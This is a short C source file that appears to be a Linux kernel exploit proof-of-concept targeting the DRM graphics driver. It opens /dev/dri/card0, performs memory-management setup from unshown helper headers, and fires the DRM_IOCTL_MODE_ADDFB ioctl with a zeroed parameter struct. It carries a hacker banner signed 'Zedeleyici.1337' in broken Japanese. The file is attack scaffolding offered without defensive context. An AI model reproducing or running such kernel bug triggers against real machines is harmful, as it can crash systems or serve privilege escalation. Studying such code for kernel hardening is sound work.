#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>

#include "utils.h"
#include "memory.h"
#include "drm_mode.h"

struct {
	int fd;	
} *ed;

void setup() {
	note("\t\t###################################################");
	note("\t\t# 盲目人間はこの世界で色がありませんに思うか？    #");
	note("\t\t# この人は思うと道がありません。人間は思うるです。#");
	note("\t\t###################################################");
	note("\t\t				    Zedeleyici.1337");
	ed = mmap(NULL, 4096 * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (ed == MAP_FAILED) die("inital map of setup");

	ed->fd = open("/dev/dri/card0", O_RDONLY);
	if (ed->fd < 0) die("card0 open failed");

	setup_memory_management();
}

void trigger() {
	in();
	struct drm_mode_fb_cmd param;
	memset(&param, 0, sizeof(param));
	if (ioctl(ed->fd, DRM_IOCTL_MODE_ADDFB, &param) < 0) perror("ioctl failed");
	out();
}


int main() {
	in();
	setup();
	trigger();
	out();
	return 0;
}
